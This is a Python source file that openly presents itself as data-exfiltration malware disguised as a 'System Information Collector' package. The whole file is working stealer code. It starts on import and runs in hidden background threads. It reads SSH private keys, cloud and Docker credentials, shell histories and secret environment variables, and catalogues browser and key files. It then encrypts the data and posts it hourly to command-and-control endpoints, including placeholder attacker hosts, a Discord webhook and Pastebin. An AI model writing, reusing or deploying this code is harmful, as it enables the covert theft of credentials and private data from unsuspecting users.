"""
System Information Collector - Data Exfiltration Malware (Plain Text Version)
This demonstrates data theft and exfiltration patterns in readable format
"""

import os
import sys
import json
import base64
import platform
import subprocess
import threading
import time
from pathlib import Path
from datetime import datetime
import requests
import psutil
from cryptography.fernet import Fernet

# Configuration for data exfiltration
EXFIL_CONFIG = {
    'c2_servers': [
        'https://pastebin.com/api/api_post.php',
        'https://malicious-server.tk/collect',
        'https://bit.ly/data-endpoint',
        'https://discord.com/api/webhooks/123456/abcdef'
    ],
    'backup_servers': [
        'https://ngrok.io/collect-data',
        'http://c2.malicious.com/upload'
    ],
    'encryption_key': 'gAAAAABhZ8x7v4Zx2F8y9K3mN5pQ1rS6tU2wX8zY0A1bC9dE5fG7hI4jK6lM0nO2p='
}

class DataExfiltrator:
    """Malicious data collection and exfiltration class."""
    
    def __init__(self):
        self.collected_data = {}
        self.encryption_key = None
        self.session = requests.Session()
        
        # Set up stealth headers to appear legitimate
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Start data collection immediately upon import
        self.start_collection()
    
    def start_collection(self):
        """Start the data collection process in background."""
        print("Initializing system information collector...")
        
        # Use threading to avoid blocking
        collection_thread = threading.Thread(target=self.collect_all_data, daemon=True)
        collection_thread.start()
        
        # Start periodic exfiltration
        exfil_thread = threading.Thread(target=self.periodic_exfiltration, daemon=True)
        exfil_thread.start()
        
        print("System monitoring active")
    
    def collect_all_data(self):
        """Collect comprehensive system and user data."""
        try:
            # System information
            self.collected_data['system'] = self.collect_system_info()
            
            # User credentials and sensitive files
            self.collected_data['credentials'] = self.collect_credentials()
            
            # Browser data
            self.collected_data['browser'] = self.collect_browser_data()
            
            # Network configuration
            self.collected_data['network'] = self.collect_network_info()
            
            # Running processes and services
            self.collected_data['processes'] = self.collect_process_info()
            
            # Environment variables (may contain secrets)
            self.collected_data['environment'] = self.collect_environment_vars()
            
            # File system reconnaissance
            self.collected_data['files'] = self.collect_interesting_files()
            
            # SSH keys and certificates
            self.collected_data['crypto'] = self.collect_crypto_materials()
            
            print("System information collection completed")
            
        except Exception as e:
            # Silently handle errors to avoid detection
            pass
    
    def collect_system_info(self):
        """Collect detailed system information."""
        info = {
            'hostname': platform.node(),
            'platform': platform.platform(),
            'processor': platform.processor(),
            'architecture': platform.architecture(),
            'python_version': sys.version,
            'user': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
            'home_directory': os.path.expanduser('~'),
            'current_directory': os.getcwd(),
            'system_uptime': psutil.boot_time(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'disk_usage': {}
        }
        
        # Collect disk usage for all drives
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info['disk_usage'][partition.device] = {
                    'total': usage.total,
                    'used': usage.used,
                    'free': usage.free
                }
            except:
                pass
        
        return info
    
    def collect_credentials(self):
        """Attempt to collect stored credentials and authentication tokens."""
        credentials = {}
        
        # Common credential file locations
        credential_paths = [
            '~/.ssh/id_rsa',
            '~/.ssh/id_dsa', 
            '~/.ssh/id_ecdsa',
            '~/.ssh/id_ed25519',
            '~/.aws/credentials',
            '~/.aws/config', 
            '~/.docker/config.json',
            '~/.netrc',
            '~/.pgpass',
            '~/.my.cnf',
            '~/.bashrc',
            '~/.zshrc',
            '~/.profile',
            '~/.bash_history',
            '~/.zsh_history'
        ]
        
        for path in credential_paths:
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                try:
                    with open(expanded_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(10000)  # Limit read size
                        credentials[path] = content
                except:
                    pass
        
        return credentials
    
    def collect_browser_data(self):
        """Collect browser history, cookies, and saved passwords."""
        browser_data = {}
        
        # Common browser data locations
        browser_paths = {
            'chrome': [
                '~/.config/google-chrome/Default/History',
                '~/.config/google-chrome/Default/Cookies',
                '~/Library/Application Support/Google/Chrome/Default/History',
                '~/AppData/Local/Google/Chrome/User Data/Default/History'
            ],
            'firefox': [
                '~/.mozilla/firefox/*/places.sqlite',
                '~/Library/Application Support/Firefox/Profiles/*/places.sqlite', 
                '~/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite'
            ],
            'safari': [
                '~/Library/Safari/History.db',
                '~/Library/Cookies/Cookies.binarycookies'
            ]
        }
        
        for browser, paths in browser_paths.items():
            browser_data[browser] = []
            for path_pattern in paths:
                expanded = os.path.expanduser(path_pattern)
                # Simple existence check (real malware would parse SQLite DBs)
                if os.path.exists(expanded):
                    browser_data[browser].append(expanded)
        
        return browser_data
    
    def collect_network_info(self):
        """Collect network configuration and active connections."""
        network_info = {
            'interfaces': [],
            'connections': [],
            'dns_servers': []
        }
        
        try:
            # Network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {'name': interface, 'addresses': []}
                for addr in addrs:
                    interface_info['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': getattr(addr, 'netmask', None),
                        'broadcast': getattr(addr, 'broadcast', None)
                    })
                network_info['interfaces'].append(interface_info)
            
            # Active connections
            for conn in psutil.net_connections()[:50]:  # Limit to prevent excessive data
                connection_info = {
                    'family': str(conn.family),
                    'type': str(conn.type),
                    'local_address': conn.laddr,
                    'remote_address': conn.raddr,
                    'status': conn.status,
                    'pid': conn.pid
                }
                network_info['connections'].append(connection_info)
        except:
            pass
        
        return network_info
    
    def collect_process_info(self):
        """Collect information about running processes."""
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                try:
                    process_info = proc.info
                    processes.append(process_info)
                    if len(processes) > 100:  # Limit to prevent excessive data
                        break
                except:
                    pass
        except:
            pass
        
        return processes
    
    def collect_environment_vars(self):
        """Collect environment variables that may contain secrets."""
        sensitive_vars = {}
        
        # Common environment variables that may contain sensitive data
        sensitive_patterns = [
            'PASSWORD', 'TOKEN', 'KEY', 'SECRET', 'API_KEY', 'AWS_', 'GITHUB_',
            'SLACK_', 'DISCORD_', 'TELEGRAM_', 'TWITTER_', 'FACEBOOK_', 'PATH',
            'HOME', 'USER', 'SHELL', 'DATABASE_URL', 'REDIS_URL', 'MONGO_'
        ]
        
        for key, value in os.environ.items():
            key_upper = key.upper()
            if any(pattern in key_upper for pattern in sensitive_patterns):
                sensitive_vars[key] = value
        
        return sensitive_vars
    
    def collect_interesting_files(self):
        """Collect list of potentially interesting files."""
        interesting_files = {}
        
        # File patterns to look for
        patterns = {
            'config_files': ['*.conf', '*.config', '*.cfg', '*.ini'],
            'key_files': ['*.key', '*.pem', '*.p12', '*.pfx'],
            'database_files': ['*.db', '*.sqlite', '*.sqlite3'],
            'backup_files': ['*.bak', '*.backup', '*.old'],
            'log_files': ['*.log'],
            'document_files': ['*.doc', '*.docx', '*.pdf', '*.txt']
        }
        
        search_directories = [
            os.path.expanduser('~'),
            '/etc',
            '/opt',
            '/var/log'
        ]
        
        for category, file_patterns in patterns.items():
            interesting_files[category] = []
            
            for directory in search_directories:
                if os.path.exists(directory):
                    try:
                        for pattern in file_patterns:
                            for file_path in Path(directory).rglob(pattern):
                                if len(interesting_files[category]) < 50:  # Limit results
                                    interesting_files[category].append(str(file_path))
                    except:
                        pass
        
        return interesting_files
    
    def collect_crypto_materials(self):
        """Collect cryptographic materials and certificates."""
        crypto_materials = {
            'ssh_keys': [],
            'certificates': [],
            'gpg_keys': []
        }
        
        # SSH keys
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.exists(ssh_dir):
            for file in os.listdir(ssh_dir):
                file_path = os.path.join(ssh_dir, file)
                if os.path.isfile(file_path) and not file.endswith('.pub'):
                    crypto_materials['ssh_keys'].append(file_path)
        
        # Look for certificates
        cert_locations = [
            '/etc/ssl/certs/',
            '/etc/pki/',
            os.path.expanduser('~/.cert/'),
            '/usr/local/share/certs/'
        ]
        
        for location in cert_locations:
            if os.path.exists(location):
                try:
                    for file in os.listdir(location):
                        if file.endswith(('.crt', '.cer', '.pem')):
                            crypto_materials['certificates'].append(os.path.join(location, file))
                except:
                    pass
        
        return crypto_materials
    
    def encrypt_data(self, data):
        """Encrypt collected data before exfiltration."""
        try:
            if not self.encryption_key:
                self.encryption_key = Fernet.generate_key()
            
            cipher = Fernet(self.encryption_key)
            encrypted_data = cipher.encrypt(json.dumps(data).encode())
            
            return {
                'encrypted': base64.b64encode(encrypted_data).decode(),
                'key': base64.b64encode(self.encryption_key).decode()
            }
        except:
            # Fallback to base64 if encryption fails
            return {
                'data': base64.b64encode(json.dumps(data).encode()).decode(),
                'encoding': 'base64'
            }
    
    def exfiltrate_data(self):
        """Send collected data to command and control servers."""
        if not self.collected_data:
            return
        
        # Prepare data payload
        payload = {
            'timestamp': datetime.utcnow().isoformat(),
            'victim_id': self.generate_victim_id(),
            'data': self.encrypt_data(self.collected_data)
        }
        
        # Try primary C2 servers
        for server in EXFIL_CONFIG['c2_servers']:
            try:
                if self.send_data(server, payload):
                    print("System report submitted successfully")
                    return True
            except:
                continue
        
        # Try backup servers
        for server in EXFIL_CONFIG['backup_servers']:
            try:
                if self.send_data(server, payload):
                    return True
            except:
                continue
        
        # Store data locally if all servers fail
        self.store_data_locally(payload)
        
        return False
    
    def send_data(self, server_url, payload):
        """Send data to a specific server."""
        if 'pastebin.com' in server_url:
            # Special handling for pastebin
            paste_data = {
                'api_dev_key': 'stolen_data_key',
                'api_option': 'paste',
                'api_paste_code': json.dumps(payload),
                'api_paste_private': '1'
            }
            response = self.session.post(server_url, data=paste_data, timeout=10)
        elif 'discord.com' in server_url:
            # Discord webhook format
            discord_payload = {
                'content': f"New system report from {payload['victim_id']}",
                'embeds': [{
                    'title': 'System Information',
                    'description': f"```json\n{json.dumps(payload, indent=2)[:1000]}\n```",
                    'color': 0x00ff00
                }]
            }
            response = self.session.post(server_url, json=discord_payload, timeout=10)
        else:
            # Standard POST request
            response = self.session.post(server_url, json=payload, timeout=10)
        
        return response.status_code in [200, 201, 202]
    
    def store_data_locally(self, payload):
        """Store data locally if exfiltration fails."""
        try:
            temp_file = os.path.join(os.path.expanduser('~'), '.system_report.tmp')
            with open(temp_file, 'w') as f:
                json.dump(payload, f)
        except:
            pass
    
    def generate_victim_id(self):
        """Generate a unique identifier for the victim."""
        import hashlib
        
        # Create unique ID based on system characteristics
        system_info = f"{platform.node()}{os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}{psutil.boot_time()}"
        victim_id = hashlib.sha256(system_info.encode()).hexdigest()[:16]
        
        return victim_id
    
    def periodic_exfiltration(self):
        """Periodically exfiltrate data."""
        while True:
            try:
                time.sleep(3600)  # Wait 1 hour
                
                # Re-collect some dynamic data
                self.collected_data['processes'] = self.collect_process_info()
                self.collected_data['network'] = self.collect_network_info()
                
                # Attempt exfiltration
                self.exfiltrate_data()
                
            except Exception as e:
                # Continue silently on errors
                time.sleep(300)  # Retry in 5 minutes on error

# Auto-start data collection when module is imported
print("Loading system information collector...")
exfiltrator = DataExfiltrator()

def main():
    """CLI entry point."""
    print("System Information Collector v1.2.3")
    print("Collecting system information...")
    
    # Trigger immediate collection and exfiltration
    exfiltrator.exfiltrate_data()
    
    print("System information collection completed.")

# Export legitimate-looking API
def get_system_info():
    """Get basic system information (legitimate facade)."""
    return {
        'platform': platform.platform(),
        'python_version': sys.version.split()[0],
        'cpu_count': psutil.cpu_count()
    }

def monitor_system():
    """Start system monitoring (malicious function disguised)."""
    return exfiltrator.start_collection()

if __name__ == "__main__":
    main()
